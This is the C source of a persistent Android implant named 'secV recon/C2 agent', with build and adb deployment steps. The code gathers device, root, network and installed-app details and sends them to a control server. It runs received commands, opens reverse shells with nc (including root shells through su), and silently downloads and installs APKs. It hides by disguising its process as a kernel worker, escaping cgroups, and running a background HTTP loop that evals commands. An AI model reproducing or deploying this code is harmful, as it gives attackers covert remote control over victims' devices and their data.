/*
 * secV on-device persistent recon/C2 agent v2.0
 *
 * Modes:
 *   recon   — gather device info, send to C2 once, exit
 *   exploit — send report, receive one instruction, execute it
 *   daemon  — daemonize, hide process, loop reconnect forever
 *             TCP path (LAN)  : direct socket → send report → recv cmd
 *             HTTP path (WAN) : nc-based HTTP poll loop (works over SIM/NAT)
 *
 * Build (with NDK):
 *   $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android34-clang \
 *       -O2 -static -fstack-protector-strong -o secv_agent secv_agent.c
 *
 * Build (without NDK — aarch64-linux-gnu cross-gcc):
 *   aarch64-linux-gnu-gcc -O2 -static -fstack-protector-strong \
 *       -DUSE_POPEN_PROP -o secv_agent secv_agent.c
 *
 * Deploy:
 *   adb push secv_agent /data/local/tmp/._sa
 *   adb shell chmod 755 /data/local/tmp/._sa
 *   adb shell /data/local/tmp/._sa 192.168.1.100 8889 recon
 *   adb shell /data/local/tmp/._sa 192.168.1.100 8889 8890 daemon
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>

/* Android NDK provides __system_property_get; plain gcc cross does not.
 * When USE_POPEN_PROP is defined (cross-gcc build) we use popen("getprop") */
#if defined(__ANDROID__) && !defined(USE_POPEN_PROP)
  #include <sys/system_properties.h>
  static void get_prop(const char *key, char *val, size_t sz) {
      __system_property_get(key, val);
      (void)sz;
  }
#else
  /* Works on any Android via the getprop command */
  static void get_prop(const char *key, char *val, size_t sz) {
      char cmd[256];
      snprintf(cmd, sizeof(cmd), "getprop '%s' 2>/dev/null", key);
      FILE *fp = popen(cmd, "r");
      if (!fp) { val[0] = '\0'; return; }
      size_t n = fread(val, 1, sz - 1, fp);
      pclose(fp);
      val[n] = '\0';
      char *nl = strchr(val, '\n');
      if (nl) *nl = '\0';
  }
  #ifndef PROP_VALUE_MAX
  #define PROP_VALUE_MAX 92
  #endif
#endif

#include <sys/prctl.h>

#define PROP(k, v)   get_prop(k, v, sizeof(v))
#define JSON_SIZE    32768
#define CMD_SIZE     4096
#define PID_FILE     "/data/local/tmp/._svp"
#define HTTP_POLL_SH "/data/local/tmp/._svh.sh"

static char json_buf[JSON_SIZE];
static char cmd_buf[CMD_SIZE];

/* ── helpers ── */
static int readfile(const char *path, char *buf, size_t sz) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, sz - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    char *nl = strchr(buf, '\n');
    if (nl) *nl = '\0';
    return (int)n;
}

static int runcmd(const char *cmd, char *out, size_t outsz) {
    FILE *fp = popen(cmd, "r");
    if (!fp) { if (out) out[0] = '\0'; return -1; }
    size_t n = 0;
    if (out) {
        n = fread(out, 1, outsz - 1, fp);
        out[n] = '\0';
        for (ssize_t i = (ssize_t)n - 1;
             i >= 0 && (out[i] == '\n' || out[i] == '\r'); i--)
            out[i] = '\0';
    }
    pclose(fp);
    return (int)n;
}

static void json_esc(char *buf, size_t sz) {
    char tmp[JSON_SIZE] = {0};
    size_t j = 0;
    for (size_t i = 0; buf[i] && j < sz - 2; i++) {
        if (buf[i] == '"' || buf[i] == '\\') tmp[j++] = '\\';
        tmp[j++] = buf[i];
    }
    strncpy(buf, tmp, sz - 1);
    buf[sz - 1] = '\0';
}

static int fexists(const char *path) { return access(path, F_OK) == 0; }

/* ── OUI vendor lookup ── */
typedef struct { const char *pfx; const char *vendor; } OuiEntry;
static const OuiEntry OUI_TABLE[] = {
    /* Hypervisors */
    {"00:50:56","VMware"},{"00:0c:29","VMware"},{"08:00:27","VirtualBox"},
    {"52:54:00","QEMU/KVM"},{"00:16:3e","Xen"},{"02:42:ac","Docker"},
    {"00:15:5d","Microsoft Hyper-V"},
    /* Raspberry Pi / IoT */
    {"b8:27:eb","Raspberry Pi"},{"dc:a6:32","Raspberry Pi"},{"e4:5f:01","Raspberry Pi"},
    {"28:cd:c1","Raspberry Pi"},{"2c:cf:67","Raspberry Pi"},
    {"a4:cf:12","Espressif (ESP32/IoT)"},{"24:0a:c4","Espressif (ESP32/IoT)"},
    {"70:ff:76","Arduino"},
    /* Google */
    {"3c:5a:b4","Google"},{"54:60:09","Google"},{"f4:f5:d8","Google"},
    /* Apple */
    {"fc:aa:14","Apple"},{"3c:22:fb","Apple"},{"a4:c3:f0","Apple"},
    {"88:a9:b7","Apple"},{"04:34:f6","Apple"},{"00:17:f2","Apple"},
    {"ac:bc:32","Apple"},{"f4:f1:5a","Apple"},{"8c:85:90","Apple"},
    {"78:fd:94","Apple"},{"a8:51:ab","Apple"},{"18:af:61","Apple"},
    {"f0:99:bf","Apple"},{"28:cf:e9","Apple"},{"9c:f3:87","Apple"},
    {"d0:03:4b","Apple"},{"40:98:ad","Apple"},{"b8:8d:12","Apple"},
    {"60:03:08","Apple"},{"bc:92:6b","Apple"},{"04:52:f3","Apple"},
    {"70:ec:e4","Apple"},{"14:7d:da","Apple"},{"ac:87:a3","Apple"},
    {"3c:d0:f8","Apple"},{"68:fb:7e","Apple"},{"f0:b4:79","Apple"},
    /* Samsung */
    {"00:1a:4b","Samsung"},{"40:b0:76","Samsung"},{"c4:57:6e","Samsung"},
    {"b4:3a:28","Samsung"},{"78:52:1a","Samsung"},{"98:52:b1","Samsung"},
    {"00:07:ab","Samsung"},{"a4:23:05","Samsung"},{"f8:77:b8","Samsung"},
    {"8c:71:f8","Samsung"},{"94:35:0a","Samsung"},{"20:13:e0","Samsung"},
    {"cc:07:ab","Samsung"},{"e4:92:fb","Samsung"},{"50:01:bb","Samsung"},
    /* Huawei */
    {"00:18:82","Huawei"},{"00:e0:fc","Huawei"},{"04:02:1f","Huawei"},
    {"10:1b:54","Huawei"},{"18:f0:e4","Huawei"},{"2c:ab:00","Huawei"},
    {"34:cd:be","Huawei"},{"54:89:98","Huawei"},{"68:13:24","Huawei"},
    {"9c:37:f4","Huawei"},{"ac:e2:15","Huawei"},{"e0:19:1d","Huawei"},
    /* Xiaomi */
    {"00:9e:c8","Xiaomi"},{"10:2a:b3","Xiaomi"},{"28:6c:07","Xiaomi"},
    {"34:80:b3","Xiaomi"},{"50:64:2b","Xiaomi"},{"58:44:98","Xiaomi"},
    {"64:09:80","Xiaomi"},{"74:23:44","Xiaomi"},{"78:11:dc","Xiaomi"},
    {"8c:be:be","Xiaomi"},{"f4:8b:32","Xiaomi"},{"fc:64:ba","Xiaomi"},
    /* OnePlus */
    {"08:9e:01","OnePlus"},{"14:45:1c","OnePlus"},{"ac:e2:d3","OnePlus"},
    /* LG */
    {"00:1e:75","LG"},{"00:aa:70","LG"},{"34:fc:ef","LG"},{"40:b0:fa","LG"},
    /* Sony */
    {"00:04:20","Sony"},{"00:13:a9","Sony"},{"10:08:b1","Sony"},
    {"5c:f3:70","Sony"},{"d8:c4:6a","Sony"},{"f0:7d:68","Sony"},
    /* Intel */
    {"00:1b:21","Intel"},{"8c:8d:28","Intel"},{"8c:ec:4b","Intel"},
    {"a4:34:d9","Intel"},{"f4:4d:30","Intel"},
    /* Qualcomm / MediaTek */
    {"00:02:ee","Qualcomm"},{"18:b4:30","Qualcomm"},{"e4:02:9b","Qualcomm"},
    /* Networking */
    {"00:09:5b","NETGEAR"},{"20:4e:7f","NETGEAR"},{"a0:21:b7","NETGEAR"},
    {"00:26:82","TP-Link"},{"f4:f2:6d","TP-Link"},{"50:c7:bf","TP-Link"},
    {"e8:94:f6","TP-Link"},{"30:de:4b","TP-Link"},
    {"00:50:ba","D-Link"},{"14:d6:4d","D-Link"},
    {"00:18:f3","ASUS"},{"04:92:26","ASUS"},{"2c:fd:a1","ASUS"},
    {"00:1e:e5","Linksys"},{"00:14:bf","Linksys"},
    {"00:18:18","Juniper"},{"00:1e:13","MikroTik"},{"4c:5e:0c","MikroTik"},
    {"00:09:0f","Fortinet"},{"00:15:6d","Ubiquiti"},{"04:18:d6","Ubiquiti"},
    {"24:a4:3c","Ubiquiti"},{"80:2a:a8","Ubiquiti"},
    {"00:23:24","Fortinet"},{"00:1c:73","Arista"},
    /* Cisco */
    {"00:00:0c","Cisco"},{"00:23:7d","Cisco"},{"58:97:bd","Cisco"},
    {"00:1b:54","Cisco"},{"f8:72:ea","Cisco"},
    /* Microsoft / HP / Dell */
    {"00:0d:3a","Microsoft"},{"00:12:5a","Microsoft"},
    {"00:21:5a","HP"},{"3c:d9:2b","HP"},
    {"00:14:22","Dell"},{"f8:db:88","Dell"},{"18:66:da","Dell"},
    /* Amazon / Kindle */
    {"40:b4:cd","Amazon"},{"44:65:0d","Amazon"},{"68:37:e9","Amazon"},
    {"74:c2:46","Amazon"},{"a0:02:dc","Amazon"},{"fc:a1:83","Amazon"},
    {NULL, NULL}
};

static const char *lookup_oui(const char *mac) {
    if (!mac || strlen(mac) < 8) return "";
    for (int i = 0; OUI_TABLE[i].pfx; i++) {
        if (strncasecmp(mac, OUI_TABLE[i].pfx, 8) == 0)
            return OUI_TABLE[i].vendor;
    }
    return "";
}

static void scan_neighbors(char *out, size_t outsz) {
    FILE *f = fopen("/proc/net/arp", "r");
    if (!f) { snprintf(out, outsz, "[]"); return; }

    char line[256];
    size_t pos = 0;
    out[pos++] = '[';
    int first = 1;

    fgets(line, sizeof(line), f); /* skip header */
    while (fgets(line, sizeof(line), f)) {
        char ip[32]={0}, hwtype[8]={0}, flags[8]={0};
        char mac[24]={0}, mask[8]={0}, dev[16]={0};
        if (sscanf(line, "%31s %7s %7s %23s %7s %15s",
                   ip, hwtype, flags, mac, mask, dev) < 4) continue;
        /* skip incomplete entries and null MACs */
        if (strcmp(flags,"0x0")==0 || strcmp(flags,"0x00")==0) continue;
        if (strcmp(mac,"00:00:00:00:00:00")==0) continue;

        const char *vendor = lookup_oui(mac);
        char entry[256];
        int n = snprintf(entry, sizeof(entry),
                         "%s{\"ip\":\"%s\",\"mac\":\"%s\",\"vendor\":\"%s\"}",
                         first ? "" : ",", ip, mac, vendor[0] ? vendor : "Unknown");
        if (pos + (size_t)n + 2 >= outsz) break;
        memcpy(out + pos, entry, n);
        pos += n;
        first = 0;
    }
    fclose(f);
    out[pos++] = ']';
    out[pos] = '\0';
}

/* TCP connect — returns fd or -1 */
static int tcp_connect(const char *host, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    /* 8s connect timeout via alarm */
    struct timeval tv = {8, 0};
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((uint16_t)port);
    sa.sin_addr.s_addr = inet_addr(host);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

/* ── build JSON report ── */
static void build_json(const char *mode) {
    char model[PROP_VALUE_MAX]   = {0};
    char mfr[PROP_VALUE_MAX]     = {0};
    char android[PROP_VALUE_MAX] = {0};
    char sdk[PROP_VALUE_MAX]     = {0};
    char patch[PROP_VALUE_MAX]   = {0};
    char chipset[PROP_VALUE_MAX] = {0};
    char arch[PROP_VALUE_MAX]    = {0};
    char bootlocked[16]          = {0};
    char build[256]              = {0};

    PROP("ro.product.model",                 model);
    PROP("ro.product.manufacturer",          mfr);
    PROP("ro.build.version.release",         android);
    PROP("ro.build.version.sdk",             sdk);
    PROP("ro.build.version.security_patch",  patch);
    PROP("ro.board.platform",                chipset);
    PROP("ro.product.cpu.abi",               arch);
    PROP("ro.boot.flash.locked",             bootlocked);
    PROP("ro.build.fingerprint",             build);

    char kernel[128] = {0};
    readfile("/proc/version", kernel, sizeof(kernel));

    /* root detection */
    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su",    "/data/adb/magisk/su", "/sbin/su", NULL
    };
    char root_status[256] = "none";
    char root_bin[128]    = {0};
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char tc[256], to[64] = {0};
            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(tc, to, sizeof(to));
            if (strstr(to, "uid=0")) {
                strncpy(root_status, "rooted",   sizeof(root_status) - 1);
                strncpy(root_bin,    su_paths[i], sizeof(root_bin) - 1);
                break;
            }
        }
    }
    if (runcmd("pgrep -x magiskd >/dev/null 2>&1 && echo 1", NULL, 0) == 0)
        strncat(root_status, "|magiskd", sizeof(root_status) - strlen(root_status) - 1);
    if (fexists("/dev/ksud") || fexists("/data/adb/ksud"))
        strncat(root_status, "|kernelsu", sizeof(root_status) - strlen(root_status) - 1);

    /* SELinux */
    char selinux[32] = "unknown";
    readfile("/sys/fs/selinux/enforce", selinux, sizeof(selinux));
    if (selinux[0] == '1')       strncpy(selinux, "Enforcing",  sizeof(selinux) - 1);
    else if (selinux[0] == '0')  strncpy(selinux, "Permissive", sizeof(selinux) - 1);

    /* network */
    char ip[64] = {0}, gw[64] = {0}, ports[256] = {0}, adb_tcp[16] = {0};
    runcmd("ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1", ip, sizeof(ip));
    if (!ip[0])
        runcmd("ip route get 1.1.1.1 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i==\"src\") print $(i+1)}'", ip, sizeof(ip));
    /* also check rmnet0 (mobile data) */
    if (!ip[0])
        runcmd("ip addr show rmnet0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1", ip, sizeof(ip));
    runcmd("ip route 2>/dev/null | grep default | awk '{print $3}' | head -1", gw, sizeof(gw));
    runcmd("ss -tlnp 2>/dev/null | awk 'NR>1{split($4,a,\":\");if(a[2]+0>0)printf a[2]\",\"}'", ports, sizeof(ports));
    PROP("service.adb.tcp.port", adb_tcp);

    /* neighbors — ARP table with OUI vendor lookup */
    static char nbr_buf[4096];
    scan_neighbors(nbr_buf, sizeof(nbr_buf));

    /* packages — skip in daemon/nohup_loop to avoid blocking boot with pm */
    char pkgs_count[16] = {0}, pkgs[2048] = {0};
    int is_oneshot = (strcmp(mode,"recon")==0 || strcmp(mode,"exploit")==0 || strcmp(mode,"c2")==0);
    if (is_oneshot) {
        runcmd("pm list packages 2>/dev/null | wc -l",                               pkgs_count, sizeof(pkgs_count));
        runcmd("pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\\n' ',' | sed 's/,$//'", pkgs, sizeof(pkgs));
    }

    /* termux */
    int has_termux = is_oneshot ? fexists("/data/data/com.termux") : 0;

    /* escape */
    json_esc(model,   sizeof(model));
    json_esc(kernel,  sizeof(kernel));
    json_esc(build,   sizeof(build));
    json_esc(pkgs,    sizeof(pkgs));

    snprintf(json_buf, sizeof(json_buf),
        "{"
        "\"agent\":\"secV_native/2.0\","
        "\"mode\":\"%s\","
        "\"device\":{"
            "\"model\":\"%s\",\"manufacturer\":\"%s\","
            "\"android\":\"%s\",\"sdk\":%s,"
            "\"security_patch\":\"%s\",\"chipset\":\"%s\","
            "\"arch\":\"%s\",\"kernel\":\"%s\","
            "\"root\":\"%s\",\"root_bin\":\"%s\","
            "\"selinux\":\"%s\",\"bootlocked\":\"%s\","
            "\"build\":\"%s\""
        "},"
        "\"network\":{"
            "\"ip\":\"%s\",\"gateway\":\"%s\","
            "\"adb_tcp_port\":\"%s\",\"open_ports\":\"%s\","
            "\"neighbors\":%s"
        "},"
        "\"packages\":{\"count\":%s,\"third_party\":\"%s\"},"
        "\"attack_surface\":{"
            "\"termux\":%s"
        "}"
        "}",
        mode,
        model, mfr, android, sdk,
        patch, chipset, arch, kernel,
        root_status, root_bin, selinux, bootlocked, build,
        ip, gw, adb_tcp, ports, nbr_buf,
        pkgs_count, pkgs,
        has_termux ? "true" : "false"
    );
}

/* ── execute C2 instruction ── */
static void execute_cmd(const char *cmd_start, const char *root_bin) {
    if (strncmp(cmd_start, "SH:", 3) == 0) {
        system(cmd_start + 3);

    } else if (strncmp(cmd_start, "SHELL:", 6) == 0) {
        char addr[256];
        strncpy(addr, cmd_start + 6, sizeof(addr) - 1);
        char *col = strrchr(addr, ':');
        if (col) *col = ' ';
        char rev[512];
        snprintf(rev, sizeof(rev),
            "f=$(mktemp /data/local/tmp/._svXXXXXX 2>/dev/null || echo /data/local/tmp/._sv$$) && "
            "rm -f \"$f\" 2>/dev/null && mkfifo \"$f\" 2>/dev/null && "
            "/system/bin/sh -i <\"$f\" | nc %s >\"$f\" 2>/dev/null; rm -f \"$f\" 2>/dev/null",
            addr);
        system(rev);

    } else if (strncmp(cmd_start, "ROOT_SHELL:", 11) == 0 && root_bin && root_bin[0]) {
        char addr[256];
        strncpy(addr, cmd_start + 11, sizeof(addr) - 1);
        char *col = strrchr(addr, ':');
        if (col) *col = ' ';
        char rev[512];
        snprintf(rev, sizeof(rev),
            "%s -c \""
            "f=\\$(mktemp /data/local/tmp/._svXXXXXX 2>/dev/null || echo /data/local/tmp/._sv$$) && "
            "rm -f \\\"\\$f\\\" 2>/dev/null && mkfifo \\\"\\$f\\\" 2>/dev/null && "
            "/system/bin/sh -i <\\\"\\$f\\\" | nc %s >\\\"\\$f\\\" 2>/dev/null; "
            "rm -f \\\"\\$f\\\" 2>/dev/null\"",
            root_bin, addr);
        system(rev);

    } else if (strncmp(cmd_start, "APK:", 4) == 0) {
        const char *url = cmd_start + 4;
        char apk_cmd[512];
        snprintf(apk_cmd, sizeof(apk_cmd),
            "curl -sf -o /data/local/tmp/._secv_p.apk '%s' 2>/dev/null && "
            "pm install -r -t /data/local/tmp/._secv_p.apk 2>/dev/null",
            url);
        system(apk_cmd);
    }
}

/* ── send report + optional recv command over TCP ── */
static void tcp_session(int fd, const char *mode, const char *root_bin) {
    size_t len = strlen(json_buf);
    write(fd, json_buf, len);
    write(fd, "\n", 1);

    if (strcmp(mode, "exploit") == 0 || strcmp(mode, "c2") == 0 || strcmp(mode, "daemon") == 0) {
        struct timeval tv = {12, 0};
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        ssize_t n = recv(fd, cmd_buf, sizeof(cmd_buf) - 1, 0);
        if (n > 0) {
            cmd_buf[n] = '\0';
            char *cmd_start = strstr(cmd_buf, "\"cmd\":\"");
            if (cmd_start) {
                cmd_start += 7;
                char *cmd_end = strchr(cmd_start, '"');
                if (cmd_end) {
                    *cmd_end = '\0';
                    execute_cmd(cmd_start, root_bin);
                }
            }
        }
    }
}

/* ── write HTTP polling shell script to disk ── */
static void write_http_poll_sh(const char *c2_host, int http_port) {
    FILE *fp = fopen(HTTP_POLL_SH, "w");
    if (!fp) return;
    fprintf(fp,
        "#!/system/bin/sh\n"
        "C2='%s'; HP='%d'\n"
        "TCURL=/data/data/com.termux/files/usr/bin/curl\n"
        "_curl() { if [ -x \"$TCURL\" ]; then \"$TCURL\" \"$@\"; else curl \"$@\"; fi; }\n"
        "while true; do\n"
        "  if command -v curl >/dev/null 2>&1 || [ -x \"$TCURL\" ]; then\n"
        "    _CMD=$(_curl -sf --connect-timeout 15 --max-time 20 "
              "\"http://$C2:$HP/cmd\" 2>/dev/null)\n"
        "  else\n"
        "    _CMD=$(printf 'GET /cmd HTTP/1.0\\r\\nHost: %%s\\r\\n\\r\\n' \"$C2\" | "
              "nc -w10 \"$C2\" \"$HP\" 2>/dev/null | awk '/^\\r?$/{body=1;next} body{print}')\n"
        "  fi\n"
        "  if [ -n \"$_CMD\" ]; then\n"
        "    _OUT=$(eval \"$_CMD\" 2>&1)\n"
        "    if command -v curl >/dev/null 2>&1 || [ -x \"$TCURL\" ]; then\n"
        "      _curl -sf -X POST \"http://$C2:$HP/result\" "
               "-H 'Content-Type: text/plain' --data-binary \"$_OUT\" >/dev/null 2>&1\n"
        "    else\n"
        "      _LEN=${#_OUT}\n"
        "      printf 'POST /result HTTP/1.0\\r\\nHost: %%s\\r\\n"
               "Content-Type: text/plain\\r\\nContent-Length: '"
               "'\"$_LEN\"'\\r\\n\\r\\n'"
               "'\"$_OUT\"' | nc -w10 \"$C2\" \"$HP\" >/dev/null 2>&1\n"
        "    fi\n"
        "  fi\n"
        "  sleep 20\n"
        "done\n",
        c2_host, http_port);
    fclose(fp);
    chmod(HTTP_POLL_SH, 0700);
}

/* ── spawn HTTP poll loop as background child ── */
static pid_t spawn_http_poll(const char *c2_host, int http_port) {
    write_http_poll_sh(c2_host, http_port);
    pid_t p = fork();
    if (p != 0) return p;  /* parent returns PID */
    /* child: exec the poll script */
    execl("/system/bin/sh", "sh", HTTP_POLL_SH, NULL);
    _exit(0);
}

/* ── daemon mode ─────────────────────────────────────────────────────── */
static void _escape_cgroup(void) {
    /* Move self to root of each cgroup hierarchy to escape Magisk's
     * module execution cgroup — otherwise Android kills us when
     * service.sh exits and the cgroup notify-on-release fires.
     * Tries both cgroups v1 and v2 paths. */
    static const char *cg_procs[] = {
        "/sys/fs/cgroup/cgroup.procs",    /* cgroups v2 unified */
        "/acct/cgroup.procs",
        "/dev/cpuset/cgroup.procs",
        "/dev/cgroup/procs",
        NULL
    };
    char me[16];
    snprintf(me, sizeof(me), "%d\n", getpid());
    for (int i = 0; cg_procs[i]; i++) {
        int f = open(cg_procs[i], O_WRONLY);
        if (f >= 0) { write(f, me, strlen(me)); close(f); }
    }
    /* Also move cpuset to background/foreground so we survive cpuset pruning */
    const char *cpuset_tasks[] = {
        "/dev/cpuset/background/tasks",
        "/dev/cpuset/foreground/tasks",
        NULL
    };
    snprintf(me, sizeof(me), "%d\n", getpid());
    for (int i = 0; cpuset_tasks[i]; i++) {
        int f = open(cpuset_tasks[i], O_WRONLY);
        if (f >= 0) { write(f, me, strlen(me)); close(f); break; }
    }
}

static void daemon_mode(const char *c2_host, int c2_port, int http_port) {

    /* Escape Magisk's cgroup BEFORE forking — otherwise orphaned children
     * get killed when service.sh exits and notify-on-release fires. */
    _escape_cgroup();

    /* double-fork to fully detach from session */
    pid_t p = fork();
    if (p < 0) return;
    if (p > 0) { waitpid(p, NULL, 0); return; }

    setsid();
    _escape_cgroup();  /* re-escape in first child after setsid */

    p = fork();
    if (p < 0) _exit(0);
    if (p > 0) _exit(0);

    /* redirect I/O to /dev/null */
    int dn = open("/dev/null", O_RDWR);
    if (dn >= 0) {
        dup2(dn, 0); dup2(dn, 1); dup2(dn, 2);
        close(dn);
    }
    umask(0);
    chdir("/");

    /* disguise process name in /proc/<pid>/comm */
    prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);

    /* PID lock file — prevent duplicate daemons.
     * After reboot, the old PID may be reassigned to an unrelated process.
     * Validate by checking /proc/<pid>/comm contains our disguise name. */
    int pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (pfd < 0 && errno == EEXIST) {
        char pb[16] = {0};
        int rfd = open(PID_FILE, O_RDONLY);
        if (rfd >= 0) { read(rfd, pb, sizeof(pb) - 1); close(rfd); }
        pid_t old = (pid_t)atoi(pb);
        int is_our_proc = 0;
        if (old > 1 && kill(old, 0) == 0) {
            /* verify the running PID is actually our process */
            char comm_path[64], comm_val[32] = {0};
            snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", (int)old);
            int cf = open(comm_path, O_RDONLY);
            if (cf >= 0) { read(cf, comm_val, sizeof(comm_val)-1); close(cf); }
            /* strip newline */
            char *nl = strchr(comm_val, '\n'); if (nl) *nl = 0;
            if (strcmp(comm_val, "kworker/0:1H") == 0) is_our_proc = 1;
        }
        if (is_our_proc) _exit(0);  /* genuine duplicate — already running */
        unlink(PID_FILE);
        pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    }
    if (pfd >= 0) {
        char pb[16];
        snprintf(pb, sizeof(pb), "%d\n", getpid());
        write(pfd, pb, strlen(pb));
        close(pfd);
    }

    /* gather root_bin once */
    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su", "/data/adb/magisk/su", "/sbin/su", NULL
    };
    char root_bin[128] = {0};
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char tc[256], to[64] = {0};
            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(tc, to, sizeof(to));
            if (strstr(to, "uid=0")) {
                strncpy(root_bin, su_paths[i], sizeof(root_bin) - 1);
                break;
            }
        }
    }

    /* start HTTP polling child immediately (WAN/SIM always works) */
    pid_t poll_pid = spawn_http_poll(c2_host, http_port);
    (void)poll_pid;

    /* main reconnect loop — TCP preferred, HTTP poll runs in parallel */
    int backoff = 30;
    for (;;) {
        build_json("daemon");
        int fd = tcp_connect(c2_host, c2_port);
        if (fd >= 0) {
            tcp_session(fd, "daemon", root_bin);
            close(fd);
            backoff = 30;
        }
        /* check HTTP poll child still alive, restart if needed */
        if (waitpid(poll_pid, NULL, WNOHANG) == poll_pid)
            poll_pid = spawn_http_poll(c2_host, http_port);

        sleep(backoff);
        if (backoff < 300) backoff += 30;
    }
    /* never reached */
    unlink(PID_FILE);
}

/* ── nohup_loop mode ─────────────────────────────────────────────────────
 * Launched as: setsid nohup "$BIN" host port http_port nohup_loop &
 * service.sh already put us in a new session — no fork needed.
 * We just disguise, escape cgroup, and run the reconnect loop directly. */
static void nohup_loop_mode(const char *c2_host, int c2_port, int http_port) {
    int dn = open("/dev/null", O_RDWR);
    if (dn >= 0) { dup2(dn, 0); dup2(dn, 1); dup2(dn, 2); close(dn); }
    umask(0);
    chdir("/");

    prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
    _escape_cgroup();

    /* PID lock — same validation as daemon_mode */
    int pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (pfd < 0 && errno == EEXIST) {
        char pb[16] = {0};
        int rfd = open(PID_FILE, O_RDONLY);
        if (rfd >= 0) { read(rfd, pb, sizeof(pb) - 1); close(rfd); }
        pid_t old = (pid_t)atoi(pb);
        int is_our_proc = 0;
        if (old > 1 && kill(old, 0) == 0) {
            char comm_path[64], comm_val[32] = {0};
            snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", (int)old);
            int cf = open(comm_path, O_RDONLY);
            if (cf >= 0) { read(cf, comm_val, sizeof(comm_val)-1); close(cf); }
            char *nl = strchr(comm_val, '\n'); if (nl) *nl = 0;
            if (strcmp(comm_val, "kworker/0:1H") == 0) is_our_proc = 1;
        }
        if (is_our_proc) _exit(0);
        unlink(PID_FILE);
        pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    }
    if (pfd >= 0) {
        char pb[16];
        snprintf(pb, sizeof(pb), "%d\n", getpid());
        write(pfd, pb, strlen(pb));
        close(pfd);
    }

    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su", "/data/adb/magisk/su", "/sbin/su", NULL
    };
    char root_bin[128] = {0};
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char tc[256], to[64] = {0};
            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(tc, to, sizeof(to));
            if (strstr(to, "uid=0")) { strncpy(root_bin, su_paths[i], sizeof(root_bin)-1); break; }
        }
    }

    pid_t poll_pid = spawn_http_poll(c2_host, http_port);

    int backoff = 30;
    for (;;) {
        build_json("daemon");
        int fd = tcp_connect(c2_host, c2_port);
        if (fd >= 0) { tcp_session(fd, "daemon", root_bin); close(fd); backoff = 30; }
        if (waitpid(poll_pid, NULL, WNOHANG) == poll_pid)
            poll_pid = spawn_http_poll(c2_host, http_port);
        sleep(backoff);
        if (backoff < 300) backoff += 30;
    }
}

/* ─── main ─────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    const char *c2_host  = (argc > 1) ? argv[1] : "127.0.0.1";
    int         c2_port  = (argc > 2) ? atoi(argv[2]) : 8889;
    int         http_port = (argc > 3 && atoi(argv[3]) > 0) ? atoi(argv[3]) : c2_port + 1;
    const char *mode     = (argc > 4) ? argv[4] : (argc > 3 && atoi(argv[3]) == 0 ? argv[3] : "recon");

    /* If 4th arg is a word (not a number), it's the mode with default http port */
    if (argc == 4 && atoi(argv[3]) == 0) {
        mode      = argv[3];
        http_port = c2_port + 1;
    }

    if (strcmp(mode, "daemon") == 0) {
        daemon_mode(c2_host, c2_port, http_port);
        return 0;
    }
    if (strcmp(mode, "nohup_loop") == 0) {
        nohup_loop_mode(c2_host, c2_port, http_port);
        return 0;
    }

    /* recon / exploit / c2 — single-shot */
    build_json(mode);
    puts(json_buf);
    fflush(stdout);

    /* gather root_bin for command execution */
    char root_bin[128] = {0};
    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su", "/data/adb/magisk/su", "/sbin/su", NULL
    };
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char tc[256], to[64] = {0};
            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(tc, to, sizeof(to));
            if (strstr(to, "uid=0")) {
                strncpy(root_bin, su_paths[i], sizeof(root_bin) - 1);
                break;
            }
        }
    }

    int fd = tcp_connect(c2_host, c2_port);
    if (fd >= 0) {
        tcp_session(fd, mode, root_bin);
        close(fd);
    }

    return 0;
}
